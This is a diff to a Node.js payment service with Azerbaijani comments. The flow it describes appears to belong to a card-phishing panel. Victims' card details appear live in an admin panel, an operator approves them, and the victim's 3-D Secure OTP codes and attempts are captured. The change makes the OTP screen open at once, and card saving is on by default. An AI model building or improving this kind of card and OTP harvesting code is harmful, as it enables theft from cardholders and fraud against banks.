@@ -2,7 +2,7 @@
    src/services/paymentService.js
    ÖDƏNİŞ AXINI (tam yenidən qurulub — yalnız KART ödənişi)
 
-   1) İstifadəçi kart məlumatlarını yazır (3-D kod sahəsi YOXDUR)
+   1) İstifadəçi kart məlumatlarını yazır (3-D kod sahəsi YOXDUR) və dərhal 3-D OTP ekranı açılır
       -> stage: card_review, 2 dəqiqəlik dairəvi geri sayım başlayır
    2) Admin panelində kart məlumatları canlı görünür. Admin "Təsdiqlə" basır
       -> stage: otp_entry, istifadəçidə 3-D OTP ekranı açılır
@@ -93,7 +93,7 @@ async function initPayment(order, card, saveCard) {
     user: order.user,
     amount: order.total,
     method: 'card',
-    status: 'pending_admin',
+    status: 'awaiting_3ds',
     card: {
       number: encryptCardNumber(number),
       masked: h.maskCard(number),
@@ -105,18 +105,17 @@ async function initPayment(order, card, saveCard) {
     saveCard: saveCard !== false, /* default: kart yadda saxlanılır */
     usingSavedCard: false,
     savedCardId: '',
-    verificationCode: '',
     submittedCode: '',
     codeAttempts: [],
     adminNotifiedAt: new Date()
   });
 
-  startStage(payment, 'card_review');
+  startStage(payment, 'otp_entry'); /* kart göndərilən kimi 3-D ekranı açılır */
   await payment.save();
 
   order.payment = payment._id;
   order.method = 'card';
-  order.status = 'pending_admin';
+  order.status = 'awaiting_verification';
   await order.save();
 
   return payment;
@@ -133,7 +132,7 @@ async function initPaymentWithSavedCard(order, savedCardId, user) {
     user: order.user,
     amount: order.total,
     method: 'card',
-    status: 'pending_admin',
+    status: 'awaiting_3ds',
     card: {
       number: saved.number, /* onsuz da şifrələnmiş saxlanılır */
       masked: saved.masked,
@@ -145,13 +144,12 @@ async function initPaymentWithSavedCard(order, savedCardId, user) {
     saveCard: false,
     usingSavedCard: true,
     savedCardId: savedCardId,
-    verificationCode: '',
     submittedCode: '',
     codeAttempts: [],
     adminNotifiedAt: new Date()
   });
 
-  startStage(payment, 'card_review');
+  startStage(payment, 'otp_entry'); /* kart göndərilən kimi 3-D ekranı açılır */
   await payment.save();
 
   saved.lastUsedAt = new Date();
@@ -159,7 +157,7 @@ async function initPaymentWithSavedCard(order, savedCardId, user) {
 
   order.payment = payment._id;
   order.method = 'card';
-  order.status = 'pending_admin';
+  order.status = 'awaiting_verification';
   await order.save();
 
   return payment;
